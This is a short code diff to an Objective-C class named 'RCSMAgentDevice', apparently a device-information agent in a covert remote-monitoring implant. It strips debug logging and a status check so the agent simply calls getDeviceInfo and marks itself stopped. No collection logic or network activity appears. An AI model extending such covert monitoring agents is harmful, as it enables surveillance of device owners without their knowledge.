@@ -244,28 +244,12 @@ static RCSMAgentDevice *sharedAgentDevice = nil;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-#ifdef DEBUG_DEVICE
-  NSLog(@"%s: Agent device started", __FUNCTION__);
-#endif
-  
   [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
   
-  if ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
-      [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
-  {
-    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-
-    [self getDeviceInfo];
-    
-    [innerPool release];
-  }
+  [self getDeviceInfo];
   
-//  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
-//  {
-    [mAgentConfiguration setObject: AGENT_STOPPED
-                            forKey: @"status"];
-//  }
-  
+  [mAgentConfiguration setObject: AGENT_STOPPED
+                          forKey: @"status"];
   [outerPool release];
 }
 
